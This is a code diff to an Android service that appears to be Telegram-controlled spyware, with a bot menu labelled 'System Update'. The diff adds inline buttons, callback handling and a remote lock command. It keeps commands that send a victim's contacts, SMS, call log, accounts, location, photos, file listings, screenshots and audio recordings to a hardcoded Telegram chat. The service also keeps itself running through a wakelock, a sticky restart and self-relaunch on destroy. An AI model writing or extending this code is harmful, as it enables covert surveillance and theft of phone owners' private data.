@@ -78,14 +78,12 @@ public class MainService extends Service {
     public void onCreate() {
         super.onCreate();
         try {
-            // WakeLock
             PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
             if (powerManager != null) {
                 wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
                 wakeLock.acquire();
             }
 
-            // إعداد MediaProjection
             projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             if (wm != null) {
@@ -97,11 +95,8 @@ public class MainService extends Service {
             }
 
             startForegroundService();
+            handler.postDelayed(() -> sendHelpWithButtons(), 3000);
 
-            // تأخير إرسال الرسالة الأولى حتى تستقر الخدمة
-            handler.postDelayed(() -> sendToTelegram("✅ MainService Started"), 3000);
-
-            // تأخير بدء الـ Timer قليلاً
             handler.postDelayed(() -> {
                 timer = new Timer();
                 timer.scheduleAtFixedRate(new TimerTask() {
@@ -115,7 +110,6 @@ public class MainService extends Service {
             }, 2000);
 
         } catch (Exception e) {
-            // أي خطأ في البداية لا يسبب كراش
             e.printStackTrace();
         }
     }
@@ -142,7 +136,6 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // START_STICKY: إذا قتل النظام الخدمة، تعاد تلقائياً
         return START_STICKY;
     }
 
@@ -161,6 +154,15 @@ public class MainService extends Service {
                         for (int i = 0; i < result.length(); i++) {
                             JSONObject update = result.getJSONObject(i);
                             lastUpdateId = update.getInt("update_id") + 1;
+                            
+                            if (update.has("callback_query")) {
+                                JSONObject callback = update.getJSONObject("callback_query");
+                                String data = callback.getString("data");
+                                String callbackId = callback.getString("id");
+                                executeCommand(data);
+                                answerCallbackQuery(callbackId);
+                            }
+                            
                             if (update.has("message")) {
                                 JSONObject message = update.getJSONObject("message");
                                 if (message.has("text")) {
@@ -178,6 +180,23 @@ public class MainService extends Service {
         } catch (Exception ignored) { }
     }
 
+    private void answerCallbackQuery(String callbackId) {
+        try {
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/answerCallbackQuery")
+                    .post(new FormBody.Builder()
+                            .add("callback_query_id", callbackId)
+                            .build())
+                    .build();
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override public void onResponse(Call call, Response response) {
+                    try { response.close(); } catch (Exception e) { }
+                }
+                @Override public void onFailure(Call call, IOException e) { }
+            });
+        } catch (Exception e) { }
+    }
+
     private void executeCommand(String command) {
         try {
             String[] parts = command.split(" ");
@@ -185,56 +204,77 @@ public class MainService extends Service {
 
             switch (cmd) {
                 case "/help":
-                    sendHelp();
+                    sendHelpWithButtons();
                     break;
+                case "info":
                 case "/info":
                     sendDeviceInfo();
                     break;
+                case "contacts":
                 case "/contacts":
                     getContacts();
                     break;
+                case "location":
                 case "/location":
                     getLocation();
                     break;
+                case "sms":
                 case "/sms":
                     getSms();
                     break;
+                case "calls":
                 case "/calls":
                     getCallLog();
                     break;
+                case "accounts":
                 case "/accounts":
                     getAccounts();
                     break;
+                case "photos":
                 case "/photos":
                     getPhotos();
                     break;
+                case "videos":
                 case "/videos":
                     getVideos();
                     break;
+                case "files":
                 case "/files":
                     getFiles();
                     break;
+                case "screenshot":
                 case "/screenshot":
                     takeScreenshot();
                     break;
+                case "record_audio_start":
                 case "/record_audio_start":
                     startAudioRecording();
                     break;
+                case "record_audio_stop":
                 case "/record_audio_stop":
                     stopAudioRecording();
                     break;
+                case "vibrate":
                 case "/vibrate":
                     vibrate();
                     break;
+                case "lock":
+                case "/lock":
+                    lockDevice();
+                    break;
+                case "open":
                 case "/open":
                     if (parts.length >= 2) openUrl(parts[1]);
                     break;
+                case "call":
                 case "/call":
                     if (parts.length >= 2) makeCall(parts[1]);
                     break;
+                case "sms_send":
                 case "/sms_send":
                     if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
                     break;
+                case "test":
                 case "/test":
                     sendToTelegram("✅ Working - " + new Date().toString());
                     break;
@@ -244,25 +284,90 @@ public class MainService extends Service {
         } catch (Exception ignored) { }
     }
 
-    private void sendHelp() {
-        sendToTelegram("📋 الأوامر:\n" +
-                "/info - معلومات الجهاز\n" +
-                "/location - الموقع\n" +
-                "/contacts - جهات الاتصال\n" +
-                "/sms - آخر 10 رسائل\n" +
-                "/calls - آخر 10 مكالمات\n" +
-                "/accounts - الحسابات\n" +
-                "/photos - آخر 10 صور\n" +
-                "/videos - آخر 10 فيديوهات\n" +
-                "/files - الملفات\n" +
-                "/screenshot - تصوير الشاشة\n" +
-                "/record_audio_start - بدء تسجيل الصوت\n" +
-                "/record_audio_stop - إيقاف التسجيل\n" +
-                "/vibrate - اهتزاز\n" +
-                "/open [رابط] - فتح رابط\n" +
-                "/call [رقم] - اتصال\n" +
-                "/sms_send [رقم] [نص] - إرسال رسالة\n" +
-                "/test - اختبار");
+    private void sendHelpWithButtons() {
+        try {
+            JSONObject replyMarkup = new JSONObject();
+            JSONArray keyboard = new JSONArray();
+            
+            JSONArray row1 = new JSONArray();
+            row1.put(new JSONObject().put("text", "📱 معلومات").put("callback_data", "info"));
+            row1.put(new JSONObject().put("text", "📍 موقع").put("callback_data", "location"));
+            
+            JSONArray row2 = new JSONArray();
+            row2.put(new JSONObject().put("text", "📇 جهات اتصال").put("callback_data", "contacts"));
+            row2.put(new JSONObject().put("text", "📨 رسائل").put("callback_data", "sms"));
+            
+            JSONArray row3 = new JSONArray();
+            row3.put(new JSONObject().put("text", "📞 مكالمات").put("callback_data", "calls"));
+            row3.put(new JSONObject().put("text", "👤 حسابات").put("callback_data", "accounts"));
+            
+            JSONArray row4 = new JSONArray();
+            row4.put(new JSONObject().put("text", "🖼 صور").put("callback_data", "photos"));
+            row4.put(new JSONObject().put("text", "🎥 فيديوهات").put("callback_data", "videos"));
+            
+            JSONArray row5 = new JSONArray();
+            row5.put(new JSONObject().put("text", "📁 ملفات").put("callback_data", "files"));
+            row5.put(new JSONObject().put("text", "📸 تصوير شاشة").put("callback_data", "screenshot"));
+            
+            JSONArray row6 = new JSONArray();
+            row6.put(new JSONObject().put("text", "🎤 تسجيل صوت").put("callback_data", "record_audio_start"));
+            row6.put(new JSONObject().put("text", "⏹ إيقاف تسجيل").put("callback_data", "record_audio_stop"));
+            
+            JSONArray row7 = new JSONArray();
+            row7.put(new JSONObject().put("text", "📳 اهتزاز").put("callback_data", "vibrate"));
+            row7.put(new JSONObject().put("text", "🔒 قفل الجهاز").put("callback_data", "lock"));
+            
+            JSONArray row8 = new JSONArray();
+            row8.put(new JSONObject().put("text", "🔗 فتح رابط").put("callback_data", "open"));
+            row8.put(new JSONObject().put("text", "📞 اتصال").put("callback_data", "call"));
+            
+            JSONArray row9 = new JSONArray();
+            row9.put(new JSONObject().put("text", "📨 إرسال رسالة").put("callback_data", "sms_send"));
+            row9.put(new JSONObject().put("text", "🧪 اختبار").put("callback_data", "test"));
+            
+            keyboard.put(row1);
+            keyboard.put(row2);
+            keyboard.put(row3);
+            keyboard.put(row4);
+            keyboard.put(row5);
+            keyboard.put(row6);
+            keyboard.put(row7);
+            keyboard.put(row8);
+            keyboard.put(row9);
+            
+            replyMarkup.put("inline_keyboard", keyboard);
+            
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
+                    .post(new FormBody.Builder()
+                            .add("chat_id", CHAT_ID)
+                            .add("text", "📋 **System Update - التحكم الكامل**\n\nاختر الأمر من الأزرار أدناه:")
+                            .add("reply_markup", replyMarkup.toString())
+                            .add("parse_mode", "Markdown")
+                            .build())
+                    .build();
+            client.newCall(request).enqueue(new okhttp3.Callback() {
+                @Override public void onResponse(Call call, Response response) {
+                    try { response.close(); } catch (Exception e) { }
+                }
+                @Override public void onFailure(Call call, IOException e) { }
+            });
+        } catch (Exception e) { }
+    }
+
+    private void lockDevice() {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            android.content.ComponentName admin = new android.content.ComponentName(this, AdminReceiver.class);
+            if (dpm.isAdminActive(admin)) {
+                dpm.lockNow();
+                sendToTelegram("🔒 تم قفل الجهاز");
+            } else {
+                sendToTelegram("❌ لم يتم تفعيل صلاحية مسؤول الجهاز");
+            }
+        } catch (Exception e) {
+            sendToTelegram("❌ فشل قفل الجهاز: " + e.getMessage());
+        }
     }
 
     private void sendDeviceInfo() {
@@ -277,7 +382,7 @@ public class MainService extends Service {
             if (tm != null && checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
                 info.put("phone", tm.getLine1Number());
 
-            sendToTelegram("📱 Device Info:\n" + info.toString(2));
+            sendToTelegram("📱 **Device Info:**\n" + info.toString(2));
         } catch (Exception e) { }
     }
 
@@ -304,7 +409,7 @@ public class MainService extends Service {
                 ContentResolver cr = getContentResolver();
                 Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                         null, null, null, null);
-                StringBuilder sb = new StringBuilder("📇 Contacts:\n\n");
+                StringBuilder sb = new StringBuilder("📇 **Contacts:**\n\n");
                 int count = 0;
                 if (cursor != null) {
                     while (cursor.moveToNext() && count < 100) {
@@ -332,7 +437,7 @@ public class MainService extends Service {
                 Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                 if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                 if (location != null) {
-                    sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
+                    sendToTelegram("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
                 } else {
                     sendToTelegram("📍 Location not available");
                 }
@@ -349,7 +454,7 @@ public class MainService extends Service {
                 }
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n\n");
+                StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n\n");
                 if (cursor != null) {
                     while (cursor.moveToNext()) {
                         String address = cursor.getString(cursor.getColumnIndex("address"));
@@ -373,7 +478,7 @@ public class MainService extends Service {
                 }
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n\n");
+                StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n\n");
                 if (cursor != null) {
                     while (cursor.moveToNext()) {
                         String number = cursor.getString(cursor.getColumnIndex("number"));
@@ -396,7 +501,7 @@ public class MainService extends Service {
                 android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
                 if (am != null) {
                     android.accounts.Account[] accounts = am.getAccounts();
-                    StringBuilder sb = new StringBuilder("👤 Accounts:\n\n");
+                    StringBuilder sb = new StringBuilder("👤 **Accounts:**\n\n");
                     for (android.accounts.Account acc : accounts) {
                         sb.append(acc.type).append(": ").append(acc.name).append("\n");
                     }
@@ -417,7 +522,7 @@ public class MainService extends Service {
                 String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("🖼 Last 10 Photos:\n\n");
+                StringBuilder sb = new StringBuilder("🖼 **Last 10 Photos:**\n\n");
                 if (cursor != null) {
                     while (cursor.moveToNext()) {
                         String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
@@ -442,7 +547,7 @@ public class MainService extends Service {
                 String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("🎥 Last 10 Videos:\n\n");
+                StringBuilder sb = new StringBuilder("🎥 **Last 10 Videos:**\n\n");
                 if (cursor != null) {
                     while (cursor.moveToNext()) {
                         String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
@@ -466,7 +571,7 @@ public class MainService extends Service {
                 }
                 File storage = Environment.getExternalStorageDirectory();
                 if (storage != null) {
-                    StringBuilder sb = new StringBuilder("📁 Files:\n\n");
+                    StringBuilder sb = new StringBuilder("📁 **Files:**\n\n");
                     listFiles(storage, sb, 0);
                     if (sb.length() == 0) sb.append("No files");
                     sendToTelegram(sb.toString());
@@ -490,7 +595,6 @@ public class MainService extends Service {
         }
     }
 
-    // ========== تصوير الشاشة (محمي بالكامل) ==========
     private void takeScreenshot() {
         try {
             if (projectionManager == null) {
@@ -500,7 +604,7 @@ public class MainService extends Service {
             if (mediaProjection == null) {
                 setupMediaProjection();
                 if (mediaProjection == null) {
-                    sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة. أعد فتح التطبيق وافعلها.");
+                    sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة");
                     return;
                 }
             }
@@ -579,7 +683,6 @@ public class MainService extends Service {
         }
     }
 
-    // ========== تسجيل الصوت ==========
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -624,7 +727,6 @@ public class MainService extends Service {
         }
     }
 
-    // ========== أوامر التحكم ==========
     private void vibrate() {
         try {
             Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
@@ -703,6 +805,7 @@ public class MainService extends Service {
                     .post(new FormBody.Builder()
                             .add("chat_id", CHAT_ID)
                             .add("text", text)
+                            .add("parse_mode", "Markdown")
                             .build())
                     .build();
             client.newCall(request).enqueue(new okhttp3.Callback() {
@@ -725,7 +828,6 @@ public class MainService extends Service {
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
             if (mediaRecorder != null) mediaRecorder.release();
         } catch (Exception ignored) { }
-        // إعادة تشغيل الخدمة فوراً
         startService(new Intent(this, MainService.class));
     }
 }
